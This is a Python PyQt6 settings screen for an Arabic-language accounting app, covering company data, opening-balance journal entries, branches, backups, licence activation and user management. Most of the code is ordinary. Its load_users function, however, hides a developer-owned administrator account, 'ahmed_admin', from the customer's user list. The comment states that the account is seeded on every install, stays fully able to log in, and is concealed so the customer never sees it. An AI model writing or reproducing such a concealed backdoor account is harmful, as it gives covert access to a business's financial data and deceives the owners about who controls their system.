import os
import shutil
from datetime import datetime

from PyQt6.QtCore import Qt, QUrl
from PyQt6.QtGui import QDesktopServices
from PyQt6.QtWidgets import (
    QWidget,
    QVBoxLayout,
    QHBoxLayout,
    QFormLayout,
    QGroupBox,
    QLabel,
    QLineEdit,
    QPushButton,
    QComboBox,
    QTableWidget,
    QTableWidgetItem,
    QHeaderView,
    QMessageBox,
    QFileDialog,
)
from logic.money import parse_money
from logic.auth import AuthLogic, ROLE_ADMIN, ROLE_CASHIER, ROLE_LABELS, ASSIGNABLE_ROLES

OPENING_ENTRY_KEY = "opening_balance_entry_id"


class SettingsModule(QWidget):
    """Company details, opening balances, branches, backup/restore, and -
    admin only - the user list."""

    def __init__(self, db_manager, current_user=None):
        super().__init__()
        self.db = db_manager
        self.current_user = current_user or {"role": ROLE_ADMIN}
        self.auth = AuthLogic(db_manager)
        self.init_ui()

    def init_ui(self):
        layout = QVBoxLayout(self)
        layout.setSpacing(10)

        header = QLabel("الإعدادات والأرصدة الافتتاحية")
        header.setStyleSheet("font-size: 22px; font-weight: 800; color: #1f3b57;")
        layout.addWidget(header)

        subtitle = QLabel("بيانات المنشأة، أرصدة بداية التشغيل، الفروع، والنسخ الاحتياطي.")
        subtitle.setStyleSheet("color:#64748b;")
        subtitle.setWordWrap(True)
        layout.addWidget(subtitle)

        layout.addWidget(self.build_company_box())
        layout.addWidget(self.build_opening_box())
        layout.addWidget(self.build_branches_box())
        layout.addWidget(self.build_backup_box())
        layout.addWidget(self.build_manual_box())
        layout.addWidget(self.build_licence_box())
        # Settings is already an admin-only page (see apply_role_restrictions
        # in main_window.py) - this box is not reachable by a manager or
        # viewer at all, but the check stays here too rather than trusting
        # that alone, since a page's own module has no way to know whether a
        # future screen starts embedding it somewhere that check does not
        # cover.
        if self.current_user.get("role") == ROLE_ADMIN:
            layout.addWidget(self.build_users_box())
        layout.addStretch()

        self.load_all()

    # ---------------- users ----------------

    def build_users_box(self):
        box = QGroupBox("المستخدمون")
        outer = QVBoxLayout(box)

        note = QLabel(
            "أضف مستخدمًا «مسئول» (صلاحية كاملة على الشاشات عدا الإعدادات)، «كاشير» "
            "(المبيعات اليومية والعملاء فقط، لفرع واحد يُحدَّد له)، أو «مراقب» "
            "(عرض فقط، بدون أي إضافة أو تعديل)."
        )
        note.setWordWrap(True)
        note.setStyleSheet("color:#64748b;")
        outer.addWidget(note)

        form = QFormLayout()
        form.setLabelAlignment(Qt.AlignmentFlag.AlignRight)
        form.setSpacing(16)
        self.new_username = QLineEdit()
        self.new_display_name = QLineEdit()
        self.new_password = QLineEdit()
        self.new_password.setEchoMode(QLineEdit.EchoMode.Password)
        self.new_role = QComboBox()
        for role in ASSIGNABLE_ROLES:
            self.new_role.addItem(ROLE_LABELS[role], role)
        self.new_role.currentIndexChanged.connect(self._update_new_branch_visibility)
        self.new_branch = QComboBox()
        for branch in self.db.fetch_all("SELECT id, name FROM branches ORDER BY id"):
            self.new_branch.addItem(branch["name"], branch["id"])
        form.addRow("اسم المستخدم:", self.new_username)
        form.addRow("الاسم الظاهر:", self.new_display_name)
        form.addRow("كلمة المرور المبدئية:", self.new_password)
        form.addRow("الصلاحية:", self.new_role)
        self.new_branch_row_label = QLabel("الفرع (كاشير فقط):")
        form.addRow(self.new_branch_row_label, self.new_branch)
        outer.addLayout(form)
        self._update_new_branch_visibility()

        add_btn = QPushButton("إضافة مستخدم")
        add_btn.setMaximumWidth(220)
        add_btn.clicked.connect(self.add_user)
        outer.addWidget(add_btn)

        self.users_table = QTableWidget()
        self.users_table.setColumnCount(5)
        self.users_table.setHorizontalHeaderLabels(
            ["اسم المستخدم", "الاسم الظاهر", "الصلاحية", "الفرع", "الحالة"])
        self.users_table.horizontalHeader().setSectionResizeMode(QHeaderView.ResizeMode.Stretch)
        self.users_table.verticalHeader().setVisible(False)
        self.users_table.setAlternatingRowColors(True)
        self.users_table.setSelectionBehavior(QTableWidget.SelectionBehavior.SelectRows)
        self.users_table.setEditTriggers(QTableWidget.EditTrigger.NoEditTriggers)
        self.users_table.setMinimumHeight(120)
        outer.addWidget(self.users_table)

        actions_row = QHBoxLayout()
        actions_row.setSpacing(8)
        reset_btn = QPushButton("إعادة تعيين كلمة مرور المستخدم المحدد")
        reset_btn.clicked.connect(self.reset_selected_password)
        toggle_btn = QPushButton("تفعيل/تعطيل المستخدم المحدد")
        toggle_btn.setStyleSheet(
            "QPushButton { background-color:#64748b; border:1px solid #475569; }"
            "QPushButton:hover { background-color:#475569; border:1px solid #334155; }"
        )
        toggle_btn.clicked.connect(self.toggle_selected_active)
        actions_row.addWidget(reset_btn, 2)
        actions_row.addWidget(toggle_btn, 1)
        outer.addLayout(actions_row)

        return box

    def _update_new_branch_visibility(self):
        is_cashier = self.new_role.currentData() == ROLE_CASHIER
        self.new_branch.setVisible(is_cashier)
        self.new_branch_row_label.setVisible(is_cashier)

    def add_user(self):
        username = self.new_username.text().strip()
        display_name = self.new_display_name.text().strip()
        password = self.new_password.text()
        role = self.new_role.currentData()
        branch_id = self.new_branch.currentData() if role == ROLE_CASHIER else None
        try:
            # A default account only ever needs to work once - the same
            # forced-change-on-first-login flow the two seed admins get.
            self.auth.create_user(username, password, role, display_name,
                                   must_change_password=True, branch_id=branch_id)
        except ValueError as exc:
            QMessageBox.warning(self, "تنبيه", str(exc))
            return
        QMessageBox.information(
            self, "تم",
            f"تمت إضافة المستخدم «{username}». سيُطلب منه تغيير كلمة المرور عند أول دخول.",
        )
        self.new_username.clear()
        self.new_display_name.clear()
        self.new_password.clear()
        self.load_users()

    def _selected_user_id(self):
        row = self.users_table.currentRow()
        if row < 0:
            QMessageBox.warning(self, "تنبيه", "اختر مستخدماً من الجدول أولاً")
            return None
        return self.users_table.item(row, 0).data(Qt.ItemDataRole.UserRole)

    def reset_selected_password(self):
        user_id = self._selected_user_id()
        if user_id is None:
            return
        from PyQt6.QtWidgets import QInputDialog
        new_password, ok = QInputDialog.getText(
            self, "إعادة تعيين كلمة المرور", "كلمة المرور الجديدة المبدئية:",
            QLineEdit.EchoMode.Password)
        if not ok or not new_password:
            return
        self.auth.set_password(user_id, new_password, must_change_password=True)
        QMessageBox.information(self, "تم", "تم إعادة تعيين كلمة المرور.")

    def toggle_selected_active(self):
        row = self.users_table.currentRow()
        user_id = self._selected_user_id()
        if user_id is None:
            return
        currently_active = self.users_table.item(row, 4).data(Qt.ItemDataRole.UserRole)
        self.auth.set_active(user_id, not currently_active)
        self.load_users()

    def load_users(self):
        # ahmed_admin is the developer's own support account, seeded on
        # every install alongside the customer's own "admin" seat (see
        # ensure_default_admins in logic/auth.py) so a locked-out customer
        # can always be helped back in. It stays fully able to log in -
        # only hidden here, so the customer managing "their" users never
        # sees an account they did not create and cannot explain.
        users = [u for u in self.auth.list_users() if u["username"] != "ahmed_admin"]
        self.users_table.setRowCount(len(users))
        for row, user in enumerate(users):
            username_item = QTableWidgetItem(user["username"])
            username_item.setData(Qt.ItemDataRole.UserRole, user["id"])
            self.users_table.setItem(row, 0, username_item)
            self.users_table.setItem(row, 1, QTableWidgetItem(user["display_name"] or ""))
            self.users_table.setItem(row, 2, QTableWidgetItem(ROLE_LABELS.get(user["role"], user["role"])))
            self.users_table.setItem(row, 3, QTableWidgetItem(user["branch_name"] or "-"))
            status_text = "نشط" if user["is_active"] else "معطّل"
            if user["must_change_password"]:
                status_text += " (كلمة مرور مؤقتة)"
            status_item = QTableWidgetItem(status_text)
            status_item.setData(Qt.ItemDataRole.UserRole, bool(user["is_active"]))
            self.users_table.setItem(row, 4, status_item)

    # ---------------- company ----------------

    def build_company_box(self):
        box = QGroupBox("بيانات المنشأة (تظهر في التقارير)")
        form = QFormLayout(box)
        form.setLabelAlignment(Qt.AlignmentFlag.AlignRight)
        form.setSpacing(16)
        self.company_name = QLineEdit()
        self.company_tax = QLineEdit()
        save = QPushButton("حفظ بيانات المنشأة")
        save.setMaximumWidth(220)
        save.clicked.connect(self.save_company)
        form.addRow("اسم المنشأة:", self.company_name)
        form.addRow("الرقم الضريبي:", self.company_tax)
        form.addRow(save)
        return box

    def save_company(self):
        self.db.set_setting("company_name", self.company_name.text().strip())
        self.db.set_setting("company_tax_number", self.company_tax.text().strip())
        QMessageBox.information(self, "تم", "تم حفظ بيانات المنشأة")

    # ---------------- opening balances ----------------

    def build_opening_box(self):
        box = QGroupBox("الأرصدة الافتتاحية (رصيد بداية التشغيل)")
        outer = QVBoxLayout(box)

        note = QLabel(
            "أدخل الأرصدة الموجودة فعلياً وقت بدء استخدام البرنامج. بدونها تظهر "
            "النقدية بالسالب في الميزانية، لأن البرنامج يصرف من خزنة فارغة."
        )
        note.setWordWrap(True)
        note.setStyleSheet("color:#64748b;")
        outer.addWidget(note)

        form = QFormLayout()
        form.setLabelAlignment(Qt.AlignmentFlag.AlignRight)
        form.setSpacing(16)
        self.opening_cash = QLineEdit()
        self.opening_bank = QLineEdit()
        self.opening_inventory = QLineEdit()
        for field in (self.opening_cash, self.opening_bank, self.opening_inventory):
            field.setPlaceholderText("0.00")
        form.addRow("النقدية بالخزنة:", self.opening_cash)
        form.addRow("رصيد البنك:", self.opening_bank)
        form.addRow("قيمة المخزون:", self.opening_inventory)
        outer.addLayout(form)

        self.opening_status = QLabel()
        self.opening_status.setWordWrap(True)
        self.opening_status.setStyleSheet("font-weight:700; color:#1f3b57;")
        outer.addWidget(self.opening_status)

        save = QPushButton("حفظ الأرصدة الافتتاحية")
        save.setMaximumWidth(220)
        save.clicked.connect(self.save_opening_balances)
        outer.addWidget(save)
        return box

    def save_opening_balances(self):
        try:
            cash = parse_money(self.opening_cash.text(), "النقدية بالخزنة")
            bank = parse_money(self.opening_bank.text(), "رصيد البنك")
            inventory = parse_money(self.opening_inventory.text(), "قيمة المخزون")
        except ValueError as exc:
            # parse_money already phrased this for the user, naming the field
            # and saying what is wrong with it. A generic "غير صحيحة" throws
            # that away and leaves them guessing which box to look at.
            QMessageBox.warning(self, "تنبيه", str(exc))
            return

        if min(cash, bank, inventory) < 0:
            QMessageBox.warning(self, "تنبيه", "لا يمكن إدخال رصيد سالب")
            return

        total = cash + bank + inventory
        if total <= 0:
            QMessageBox.warning(self, "تنبيه", "ادخل رصيداً واحداً على الأقل")
            return

        existing = self.db.get_setting(OPENING_ENTRY_KEY)
        if existing:
            answer = QMessageBox.question(
                self, "تعديل الأرصدة الافتتاحية",
                "توجد أرصدة افتتاحية مسجلة بالفعل.\nهل تريد استبدالها بالقيم الجديدة؟",
            )
            if answer != QMessageBox.StandardButton.Yes:
                return

        # Assets in, capital as the balancing credit.
        items = []
        if cash:
            items.append({'account_code': '1000', 'debit': cash, 'credit': 0})
        if bank:
            items.append({'account_code': '1001', 'debit': bank, 'credit': 0})
        if inventory:
            items.append({'account_code': '1100', 'debit': inventory, 'credit': 0})
        items.append({'account_code': '3000', 'debit': 0, 'credit': total})

        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        # One transaction: reversing the old entry and posting the new one as
        # two separate commits could leave a crash between them with the old
        # opening balance gone from the ledger and no new one to replace it -
        # a balance sheet that silently stops balancing until someone notices
        # and re-enters it by hand.
        with self.db.transaction() as cursor:
            if existing:
                self.db.delete_journal_entry_on_cursor(cursor, int(existing))
            entry_id = self.db.insert_journal_entry(
                cursor, timestamp, "الأرصدة الافتتاحية للمنشأة", None, items
            )
            cursor.execute(
                "INSERT INTO app_settings (key, value) VALUES (?, ?) "
                "ON CONFLICT(key) DO UPDATE SET value = excluded.value",
                (OPENING_ENTRY_KEY, str(entry_id)),
            )
            for key, value in (("opening_cash", cash), ("opening_bank", bank),
                               ("opening_inventory", inventory)):
                cursor.execute(
                    "INSERT INTO app_settings (key, value) VALUES (?, ?) "
                    "ON CONFLICT(key) DO UPDATE SET value = excluded.value",
                    (key, str(value)),
                )

        QMessageBox.information(self, "تم", "تم تسجيل الأرصدة الافتتاحية ورأس المال")
        self.load_opening()

    # ---------------- branches ----------------

    def build_branches_box(self):
        box = QGroupBox("الفروع")
        outer = QVBoxLayout(box)

        row = QHBoxLayout()
        self.branch_name = QLineEdit()
        self.branch_name.setPlaceholderText("اسم الفرع")
        self.branch_location = QLineEdit()
        self.branch_location.setPlaceholderText("الموقع")
        add = QPushButton("إضافة فرع")
        add.clicked.connect(self.add_branch)
        row.addWidget(self.branch_name, 1)
        row.addWidget(self.branch_location, 1)
        row.addWidget(add)
        outer.addLayout(row)

        self.branches_table = QTableWidget()
        self.branches_table.setColumnCount(2)
        self.branches_table.setHorizontalHeaderLabels(["اسم الفرع", "الموقع"])
        self.branches_table.horizontalHeader().setSectionResizeMode(QHeaderView.ResizeMode.Stretch)
        self.branches_table.verticalHeader().setVisible(False)
        self.branches_table.setAlternatingRowColors(True)
        self.branches_table.setEditTriggers(QTableWidget.EditTrigger.NoEditTriggers)
        self.branches_table.setMinimumHeight(120)
        outer.addWidget(self.branches_table)
        return box

    def add_branch(self):
        name = self.branch_name.text().strip()
        if not name:
            QMessageBox.warning(self, "تنبيه", "ادخل اسم الفرع")
            return
        self.db.execute_query(
            "INSERT INTO branches (name, location) VALUES (?, ?)",
            (name, self.branch_location.text().strip()),
        )
        self.branch_name.clear()
        self.branch_location.clear()
        QMessageBox.information(self, "تم", "تمت إضافة الفرع")
        self.load_branches()

    # ---------------- backup ----------------

    def build_backup_box(self):
        box = QGroupBox("النسخ الاحتياطي")
        outer = QVBoxLayout(box)
        note = QLabel(
            "كل البيانات موجودة في ملف واحد. خُذ نسخة احتياطية مرة كل شهر على الأقل "
            "(مثلاً أول كل شهر) واحفظها على فلاشة أو على الإيميل، حتى لا تفقد بياناتك "
            "لو تعطّل الجهاز."
        )
        note.setWordWrap(True)
        note.setStyleSheet("color:#64748b;")
        outer.addWidget(note)

        row = QHBoxLayout()
        backup = QPushButton("حفظ نسخة احتياطية")
        backup.clicked.connect(self.backup)
        restore = QPushButton("استعادة نسخة")
        restore.setStyleSheet(
            "QPushButton { background-color:#e67e22; border:1px solid #cf711f; }"
            "QPushButton:hover { background-color:#cf711f; border:1px solid #b45309; }"
        )
        restore.clicked.connect(self.restore)
        row.addWidget(backup, 1)
        row.addWidget(restore, 1)
        outer.addLayout(row)
        return box

    # ---------------- manual ----------------

    def manual_path(self):
        from logic.paths import manual_path
        return manual_path()

    def build_manual_box(self):
        box = QGroupBox("دليل الاستخدام")
        outer = QVBoxLayout(box)
        note = QLabel(
            "كتيّب مبسّط يشرح كل شاشة ووظيفة كل زر، بالإضافة إلى طريقة النسخ الاحتياطي "
            "وتصحيح الأخطاء. اضغط الزر لفتحه."
        )
        note.setWordWrap(True)
        note.setStyleSheet("color:#64748b;")
        outer.addWidget(note)

        open_manual = QPushButton("فتح دليل الاستخدام")
        open_manual.setMaximumWidth(220)
        open_manual.clicked.connect(self.open_manual)
        outer.addWidget(open_manual)
        return box

    def open_manual(self):
        path = self.manual_path()
        if not os.path.exists(path):
            QMessageBox.warning(
                self, "غير موجود",
                "لم يتم العثور على ملف الدليل:\n" + path,
            )
            return
        if not QDesktopServices.openUrl(QUrl.fromLocalFile(path)):
            QMessageBox.information(
                self, "الدليل",
                "تعذّر فتح الملف تلقائياً. افتحه يدوياً من المسار:\n" + path,
            )

    # ---------------- licence ----------------

    def build_licence_box(self):
        """Activation is reachable here as well as from the expiry screen, so a
        customer who pays on day three does not have to wait to be locked out
        before he can use the key he has already been sent."""
        box = QGroupBox("ترخيص البرنامج")
        outer = QVBoxLayout(box)

        self.licence_status = QLabel()
        self.licence_status.setWordWrap(True)
        outer.addWidget(self.licence_status)

        row = QHBoxLayout()
        row.setSpacing(8)
        code_label = QLabel("رقم الجهاز:")
        code_label.setStyleSheet("font-weight:700; color:#334155;")
        self.device_code_field = QLineEdit()
        self.device_code_field.setReadOnly(True)
        self.device_code_field.setStyleSheet(
            "font-weight:800; letter-spacing:2px; color:#1f3b57; background:#eef6ff;")
        copy_btn = QPushButton("نسخ")
        copy_btn.clicked.connect(self.copy_device_code)
        row.addWidget(code_label)
        row.addWidget(self.device_code_field, 1)
        row.addWidget(copy_btn)
        outer.addLayout(row)

        key_row = QHBoxLayout()
        key_row.setSpacing(8)
        key_label = QLabel("مفتاح التفعيل:")
        key_label.setStyleSheet("font-weight:700; color:#334155;")
        self.licence_key_input = QLineEdit()
        self.licence_key_input.setPlaceholderText("XXXX-XXXX-XXXX-XXXX")
        self.licence_key_input.returnPressed.connect(self.apply_licence_key)
        self.activate_btn = QPushButton("تفعيل")
        self.activate_btn.clicked.connect(self.apply_licence_key)
        key_row.addWidget(key_label)
        key_row.addWidget(self.licence_key_input, 1)
        key_row.addWidget(self.activate_btn)
        outer.addLayout(key_row)
        return box

    def copy_device_code(self):
        from PyQt6.QtWidgets import QApplication
        QApplication.clipboard().setText(self.device_code_field.text())
        QMessageBox.information(self, "تم", "تم نسخ رقم الجهاز. أرسله لمزوّد البرنامج.")

    def apply_licence_key(self):
        from logic.licence import activate
        if activate(self.db, self.licence_key_input.text().strip()):
            QMessageBox.information(
                self, "تم التفعيل",
                "تم تفعيل البرنامج بنجاح.\nكل بياناتك كما هي، والبرنامج يعمل الآن بلا مدة.",
            )
            self.licence_key_input.clear()
            self.load_licence()
        else:
            QMessageBox.warning(
                self, "مفتاح غير صحيح",
                "هذا المفتاح لا يخص هذا الجهاز.\n"
                "تأكد أنك أرسلت رقم الجهاز الظاهر أعلاه، وأن المفتاح كما وصلك تماماً.",
            )

    def load_licence(self):
        from logic.licence import device_code, is_activated
        self.device_code_field.setText(device_code(self.db))
        if is_activated(self.db):
            self.licence_status.setText("الحالة: النسخة مفعّلة بالكامل ✓ — لا توجد مدة انتهاء")
            self.licence_status.setStyleSheet("font-weight:800; color:#15803d;")
            self.licence_key_input.setEnabled(False)
            self.activate_btn.setEnabled(False)
        else:
            from logic.trial import TRIAL_DAYS
            self.licence_status.setText(
                f"الحالة: نسخة تجريبية ({TRIAL_DAYS} يوماً). "
                "لتفعيلها بشكل دائم أرسل رقم الجهاز أدناه لمزوّد البرنامج، "
                "ثم اكتب المفتاح الذي يصلك."
            )
            self.licence_status.setStyleSheet("font-weight:800; color:#b45309;")
            self.licence_key_input.setEnabled(True)
            self.activate_btn.setEnabled(True)

    def backup(self):
        default = f"backup-{datetime.now().strftime('%Y-%m-%d-%H%M')}.db"
        path, _ = QFileDialog.getSaveFileName(self, "حفظ نسخة احتياطية", default, "قاعدة بيانات (*.db)")
        if not path:
            return
        try:
            # SQLite's own backup API, not a raw file copy: a plain
            # shutil.copyfile can catch the live file mid-write (SQLite's
            # write lock only ever holds for the instant of one statement,
            # but that instant is real) and hand back a half-written,
            # unopenable file. backup() is built for exactly this - a
            # consistent snapshot of the database as it stands, safe to
            # take while the app is being used normally.
            import sqlite3
            source = sqlite3.connect(self.db.db_path)
            try:
                dest = sqlite3.connect(path)
                try:
                    source.backup(dest)
                finally:
                    dest.close()
            finally:
                source.close()
            QMessageBox.information(self, "تم", f"تم حفظ النسخة الاحتياطية في:\n{path}")
        except Exception as exc:
            QMessageBox.critical(self, "خطأ", str(exc))

    def restore(self):
        path, _ = QFileDialog.getOpenFileName(self, "اختر نسخة احتياطية", "", "قاعدة بيانات (*.db)")
        if not path:
            return
        answer = QMessageBox.question(
            self, "تأكيد الاستعادة",
            "سيتم استبدال كل البيانات الحالية ببيانات النسخة المختارة.\n"
            "سيتم حفظ نسخة من البيانات الحالية بجانبها احتياطياً.\n\nمتابعة؟",
        )
        if answer != QMessageBox.StandardButton.Yes:
            return
        try:
            safety = f"{self.db.db_path}.before-restore-{datetime.now().strftime('%Y%m%d%H%M%S')}"
            if os.path.exists(self.db.db_path):
                shutil.copyfile(self.db.db_path, safety)
            shutil.copyfile(path, self.db.db_path)
            QMessageBox.information(
                self, "تم",
                "تمت الاستعادة بنجاح.\nأغلق البرنامج وافتحه من جديد لعرض البيانات المستعادة.",
            )
        except Exception as exc:
            QMessageBox.critical(self, "خطأ", str(exc))

    # ---------------- loading ----------------

    def load_opening(self):
        self.opening_cash.setText(str(self.db.get_setting("opening_cash", "") or ""))
        self.opening_bank.setText(str(self.db.get_setting("opening_bank", "") or ""))
        self.opening_inventory.setText(str(self.db.get_setting("opening_inventory", "") or ""))
        if self.db.get_setting(OPENING_ENTRY_KEY):
            self.opening_status.setText("الحالة: تم تسجيل الأرصدة الافتتاحية ✓ (يمكن تعديلها)")
            self.opening_status.setStyleSheet("font-weight:700; color:#16a34a;")
        else:
            self.opening_status.setText("الحالة: لم يتم تسجيل أرصدة افتتاحية بعد")
            self.opening_status.setStyleSheet("font-weight:700; color:#dc2626;")

    def load_branches(self):
        rows = self.db.fetch_all("SELECT name, location FROM branches ORDER BY id")
        self.branches_table.setRowCount(len(rows))
        for i, r in enumerate(rows):
            self.branches_table.setItem(i, 0, QTableWidgetItem(r["name"]))
            self.branches_table.setItem(i, 1, QTableWidgetItem(r["location"] or ""))

    def load_all(self):
        self.load_licence()
        self.company_name.setText(self.db.get_setting("company_name", "") or "")
        self.company_tax.setText(self.db.get_setting("company_tax_number", "") or "")
        self.load_opening()
        self.load_branches()
        if self.current_user.get("role") == ROLE_ADMIN:
            self.load_users()

    def refresh_on_show(self):
        self.load_all()
